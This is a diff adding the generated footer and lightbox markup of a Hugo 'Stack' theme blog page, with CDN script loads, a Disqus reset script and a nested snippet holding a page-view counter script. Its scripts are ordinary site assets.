+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
